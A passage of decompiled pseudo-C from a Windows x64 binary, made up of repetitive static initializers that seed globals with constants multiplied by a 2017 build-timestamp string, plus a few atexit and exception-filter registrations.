  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9B14 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9B14: using guessed type int dword_1400D9B14;

//----- (00000001400012B0) ----------------------------------------------------
__int64 sub_1400012B0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9B10 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9B10: using guessed type int dword_1400D9B10;

//----- (00000001400012D0) ----------------------------------------------------
__int64 sub_1400012D0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9B18 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9B18: using guessed type int dword_1400D9B18;

//----- (00000001400012F0) ----------------------------------------------------
__int64 sub_1400012F0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9B0C = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9B0C: using guessed type int dword_1400D9B0C;

//----- (0000000140001310) ----------------------------------------------------
__int64 sub_140001310()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9B7C = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9B7C: using guessed type int dword_1400D9B7C;

//----- (0000000140001330) ----------------------------------------------------
__int64 sub_140001330()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9B78 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9B78: using guessed type int dword_1400D9B78;

//----- (0000000140001350) ----------------------------------------------------
__int64 sub_140001350()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9B80 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9B80: using guessed type int dword_1400D9B80;

//----- (0000000140001370) ----------------------------------------------------
__int64 sub_140001370()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9B74 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9B74: using guessed type int dword_1400D9B74;

//----- (0000000140001390) ----------------------------------------------------
__int64 sub_140001390()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BC0 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BC0: using guessed type int dword_1400D9BC0;

//----- (00000001400013B0) ----------------------------------------------------
__int64 sub_1400013B0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BBC = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BBC: using guessed type int dword_1400D9BBC;

//----- (00000001400013D0) ----------------------------------------------------
__int64 sub_1400013D0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BC4 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BC4: using guessed type int dword_1400D9BC4;

//----- (00000001400013F0) ----------------------------------------------------
__int64 sub_1400013F0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BB8 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BB8: using guessed type int dword_1400D9BB8;

//----- (0000000140001410) ----------------------------------------------------
__int64 sub_140001410()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BD4 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BD4: using guessed type int dword_1400D9BD4;

//----- (0000000140001430) ----------------------------------------------------
__int64 sub_140001430()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BD0 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BD0: using guessed type int dword_1400D9BD0;

//----- (0000000140001450) ----------------------------------------------------
__int64 sub_140001450()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BD8 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BD8: using guessed type int dword_1400D9BD8;

//----- (0000000140001470) ----------------------------------------------------
__int64 sub_140001470()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BCC = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BCC: using guessed type int dword_1400D9BCC;

//----- (0000000140001490) ----------------------------------------------------
__int64 sub_140001490()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BFC = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BFC: using guessed type int dword_1400D9BFC;

//----- (00000001400014B0) ----------------------------------------------------
__int64 sub_1400014B0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BF8 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BF8: using guessed type int dword_1400D9BF8;

//----- (00000001400014D0) ----------------------------------------------------
__int64 sub_1400014D0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9C00 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9C00: using guessed type int dword_1400D9C00;

//----- (00000001400014F0) ----------------------------------------------------
__int64 sub_1400014F0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9BF4 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9BF4: using guessed type int dword_1400D9BF4;

//----- (0000000140001510) ----------------------------------------------------
int sub_140001510()
{
  sub_14000FEE0(&unk_1400D9C28);
  return atexit(sub_14009FC20);
}
// 14000FEE0: using guessed type __int64 __fastcall sub_14000FEE0(_QWORD);

//----- (0000000140001530) ----------------------------------------------------
int sub_140001530()
{
  sub_1400102F0(&unk_1400D9C38);
  return atexit(sub_14009FC60);
}
// 1400102F0: using guessed type __int64 __fastcall sub_1400102F0(_QWORD);

//----- (0000000140001550) ----------------------------------------------------
__int64 sub_140001550()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9C14 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9C14: using guessed type int dword_1400D9C14;

//----- (0000000140001570) ----------------------------------------------------
__int64 sub_140001570()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9C10 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9C10: using guessed type int dword_1400D9C10;

//----- (0000000140001590) ----------------------------------------------------
__int64 sub_140001590()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9C24 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9C24: using guessed type int dword_1400D9C24;

//----- (00000001400015B0) ----------------------------------------------------
__int64 sub_1400015B0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9C0C = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9C0C: using guessed type int dword_1400D9C0C;

//----- (00000001400015D0) ----------------------------------------------------
__int64 sub_1400015D0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9CA4 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9CA4: using guessed type int dword_1400D9CA4;

//----- (00000001400015F0) ----------------------------------------------------
__int64 sub_1400015F0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9CA0 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9CA0: using guessed type int dword_1400D9CA0;

//----- (0000000140001610) ----------------------------------------------------
__int64 sub_140001610()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9CA8 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9CA8: using guessed type int dword_1400D9CA8;

//----- (0000000140001630) ----------------------------------------------------
__int64 sub_140001630()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9C9C = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9C9C: using guessed type int dword_1400D9C9C;

//----- (0000000140001650) ----------------------------------------------------
__int64 sub_140001650()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9CD8 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9CD8: using guessed type int dword_1400D9CD8;

//----- (0000000140001670) ----------------------------------------------------
__int64 sub_140001670()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9CD4 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9CD4: using guessed type int dword_1400D9CD4;

//----- (0000000140001690) ----------------------------------------------------
__int64 sub_140001690()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9CDC = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9CDC: using guessed type int dword_1400D9CDC;

//----- (00000001400016B0) ----------------------------------------------------
__int64 sub_1400016B0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9CD0 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9CD0: using guessed type int dword_1400D9CD0;

//----- (00000001400016D0) ----------------------------------------------------
__int64 sub_1400016D0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9D74 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9D74: using guessed type int dword_1400D9D74;

//----- (00000001400016F0) ----------------------------------------------------
__int64 sub_1400016F0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9D70 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9D70: using guessed type int dword_1400D9D70;

//----- (0000000140001710) ----------------------------------------------------
__int64 sub_140001710()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9D78 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9D78: using guessed type int dword_1400D9D78;

//----- (0000000140001730) ----------------------------------------------------
__int64 sub_140001730()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9D6C = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9D6C: using guessed type int dword_1400D9D6C;

//----- (0000000140001750) ----------------------------------------------------
__int64 sub_140001750()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9DC8 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9DC8: using guessed type int dword_1400D9DC8;

//----- (0000000140001770) ----------------------------------------------------
__int64 sub_140001770()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9DC4 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9DC4: using guessed type int dword_1400D9DC4;

//----- (0000000140001790) ----------------------------------------------------
__int64 sub_140001790()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9DCC = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9DCC: using guessed type int dword_1400D9DCC;

//----- (00000001400017B0) ----------------------------------------------------
__int64 sub_1400017B0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9DC0 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9DC0: using guessed type int dword_1400D9DC0;

//----- (00000001400017D0) ----------------------------------------------------
__int64 sub_1400017D0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9E48 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9E48: using guessed type int dword_1400D9E48;

//----- (00000001400017F0) ----------------------------------------------------
__int64 sub_1400017F0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9E40 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9E40: using guessed type int dword_1400D9E40;

//----- (0000000140001810) ----------------------------------------------------
char *sub_140001810()
{
  char *result; // rax

  result = sub_140019810();
  qword_1400D9E30 = result;
  return result;
}

//----- (0000000140001830) ----------------------------------------------------
__int64 sub_140001830()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9E4C = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9E4C: using guessed type int dword_1400D9E4C;

//----- (0000000140001850) ----------------------------------------------------
__int64 sub_140001850()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9E2C = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9E2C: using guessed type int dword_1400D9E2C;

//----- (0000000140001870) ----------------------------------------------------
__int64 sub_140001870()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9EF4 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9EF4: using guessed type int dword_1400D9EF4;

//----- (0000000140001890) ----------------------------------------------------
__int64 sub_140001890()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9EF0 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9EF0: using guessed type int dword_1400D9EF0;

//----- (00000001400018B0) ----------------------------------------------------
__int64 sub_1400018B0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9EF8 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9EF8: using guessed type int dword_1400D9EF8;

//----- (00000001400018D0) ----------------------------------------------------
__int64 sub_1400018D0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400D9EEC = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400D9EEC: using guessed type int dword_1400D9EEC;

//----- (00000001400018F0) ----------------------------------------------------
__int64 sub_1400018F0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA320 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA320: using guessed type int dword_1400DA320;

//----- (0000000140001910) ----------------------------------------------------
__int64 sub_140001910()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA31C = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA31C: using guessed type int dword_1400DA31C;

//----- (0000000140001930) ----------------------------------------------------
__int64 sub_140001930()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA324 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA324: using guessed type int dword_1400DA324;

//----- (0000000140001950) ----------------------------------------------------
__int64 sub_140001950()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA318 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA318: using guessed type int dword_1400DA318;

//----- (0000000140001970) ----------------------------------------------------
__int64 sub_140001970()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA338 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA338: using guessed type int dword_1400DA338;

//----- (0000000140001990) ----------------------------------------------------
__int64 sub_140001990()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA334 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA334: using guessed type int dword_1400DA334;

//----- (00000001400019B0) ----------------------------------------------------
__int64 sub_1400019B0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA33C = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA33C: using guessed type int dword_1400DA33C;

//----- (00000001400019D0) ----------------------------------------------------
__int64 sub_1400019D0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA330 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA330: using guessed type int dword_1400DA330;

//----- (00000001400019F0) ----------------------------------------------------
__int64 sub_1400019F0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA358 = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA358: using guessed type int dword_1400DA358;

//----- (0000000140001A10) ----------------------------------------------------
__int64 sub_140001A10()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA354 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA354: using guessed type int dword_1400DA354;

//----- (0000000140001A30) ----------------------------------------------------
__int64 sub_140001A30()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA360 = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA360: using guessed type int dword_1400DA360;

//----- (0000000140001A50) ----------------------------------------------------
__int64 sub_140001A50()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA350 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA350: using guessed type int dword_1400DA350;

//----- (0000000140001A70) ----------------------------------------------------
__int64 sub_140001A70()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA408 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA408: using guessed type int dword_1400DA408;

//----- (0000000140001A90) ----------------------------------------------------
__int64 sub_140001A90()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA404 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA404: using guessed type int dword_1400DA404;

//----- (0000000140001AB0) ----------------------------------------------------
__int64 sub_140001AB0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA40C = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA40C: using guessed type int dword_1400DA40C;

//----- (0000000140001AD0) ----------------------------------------------------
__int64 sub_140001AD0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA400 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA400: using guessed type int dword_1400DA400;

//----- (0000000140001AF0) ----------------------------------------------------
__int64 sub_140001AF0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA42C = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA42C: using guessed type int dword_1400DA42C;

//----- (0000000140001B10) ----------------------------------------------------
__int64 sub_140001B10()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA428 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA428: using guessed type int dword_1400DA428;

//----- (0000000140001B30) ----------------------------------------------------
char *sub_140001B30()
{
  char *result; // rax

  result = sub_14002AD60();
  qword_1400DA418 = result;
  return result;
}

//----- (0000000140001B50) ----------------------------------------------------
__int64 sub_140001B50()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA434 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA434: using guessed type int dword_1400DA434;

//----- (0000000140001B70) ----------------------------------------------------
__int64 sub_140001B70()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA424 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA424: using guessed type int dword_1400DA424;

//----- (0000000140001B90) ----------------------------------------------------
__int64 sub_140001B90()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA48C = 380116160 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA48C: using guessed type int dword_1400DA48C;

//----- (0000000140001BB0) ----------------------------------------------------
__int64 sub_140001BB0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA488 = 123456789 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA488: using guessed type int dword_1400DA488;

//----- (0000000140001BD0) ----------------------------------------------------
__int64 sub_140001BD0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA49C = 521288629 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA49C: using guessed type int dword_1400DA49C;

//----- (0000000140001BF0) ----------------------------------------------------
__int64 sub_140001BF0()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Wed Oct 18 19:38:35 2017";
  dword_1400DA484 = 362436069 * (unsigned __int64)"Wed Oct 18 19:38:35 2017";
  return result;
}
// 1400DA484: using guessed type int dword_1400DA484;

//----- (0000000140001C10) ----------------------------------------------------
__int64 sub_140001C10()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA4E8 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA4E8: using guessed type int dword_1400DA4E8;

//----- (0000000140001C30) ----------------------------------------------------
__int64 sub_140001C30()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA4E4 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA4E4: using guessed type int dword_1400DA4E4;

//----- (0000000140001C50) ----------------------------------------------------
LPTOP_LEVEL_EXCEPTION_FILTER sub_140001C50()
{
  return SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)sub_14002E430);
}

//----- (0000000140001C60) ----------------------------------------------------
__int64 sub_140001C60()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA4F0 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA4F0: using guessed type int dword_1400DA4F0;

//----- (0000000140001C80) ----------------------------------------------------
__int64 sub_140001C80()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA4E0 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA4E0: using guessed type int dword_1400DA4E0;

//----- (0000000140001CA0) ----------------------------------------------------
__int64 sub_140001CA0()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA548 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA548: using guessed type int dword_1400DA548;

//----- (0000000140001CC0) ----------------------------------------------------
__int64 sub_140001CC0()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA544 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA544: using guessed type int dword_1400DA544;

//----- (0000000140001CE0) ----------------------------------------------------
__int64 sub_140001CE0()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA54C = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA54C: using guessed type int dword_1400DA54C;

//----- (0000000140001D00) ----------------------------------------------------
__int64 sub_140001D00()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA540 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA540: using guessed type int dword_1400DA540;

//----- (0000000140001D20) ----------------------------------------------------
__int64 sub_140001D20()
{
  __int64 result; // rax

  result = 380116160 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA5D8 = 380116160 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA5D8: using guessed type int dword_1400DA5D8;

//----- (0000000140001D40) ----------------------------------------------------
__int64 sub_140001D40()
{
  __int64 result; // rax

  result = 123456789 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA5D4 = 123456789 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA5D4: using guessed type int dword_1400DA5D4;

//----- (0000000140001D60) ----------------------------------------------------
__int64 sub_140001D60()
{
  __int64 result; // rax

  result = 521288629 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA5E0 = 521288629 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA5E0: using guessed type int dword_1400DA5E0;

//----- (0000000140001D80) ----------------------------------------------------
__int64 sub_140001D80()
{
  __int64 result; // rax

  result = 362436069 * (unsigned int)"Fri Oct 20 16:42:35 2017";
  dword_1400DA5D0 = 362436069 * (unsigned __int64)"Fri Oct 20 16:42:35 2017";
  return result;
}
// 1400DA5D0: using guessed type int dword_1400DA5D0;

//----- (0000000140001DA0) ----------------------------------------------------
__int64 *sub_140001DA0()
{
  __int64 *result; // rax

  if ( !(dword_1400DA6A0 & 1) )
  {
    dword_1400DA6A0 |= 1u;
    qword_1400DA698 = (__int64)off_1400A7728;
    atexit(sub_14009FD80);
  }
  result = &qword_1400DA698;
  qword_1400DA638 = (__int64)&qword_1400DA698;
  return result;
}
// 1400A7728: using guessed type __int64 (__fastcall *off_1400A7728[2])();
// 1400DA638: using guessed type __int64 qword_1400DA638;
// 1400DA698: using guessed type __int64 qword_1400DA698;
// 1400DA6A0: using guessed type int dword_1400DA6A0;

//----- (0000000140001DF0) ----------------------------------------------------
__int64 *sub_140001DF0()
{
  __int64 *result; // rax

  if ( !(dword_1400DA690 & 1) )
  {
    dword_1400DA690 |= 1u;
    qword_1400DA688 = (__int64)off_1400A7758;
    atexit(sub_14009FD90);
  }
  result = &qword_1400DA688;
  qword_1400DA650 = (__int64)&qword_1400DA688;
  return result;
}
// 1400A7758: using guessed type __int64 (__fastcall *off_1400A7758[2])();
// 1400DA650: using guessed type __int64 qword_1400DA650;
// 1400DA688: using guessed type __int64 qword_1400DA688;
// 1400DA690: using guessed type int dword_1400DA690;

//----- (0000000140001E40) ----------------------------------------------------
__int64 *sub_140001E40()
{
  __int64 *result; // rax

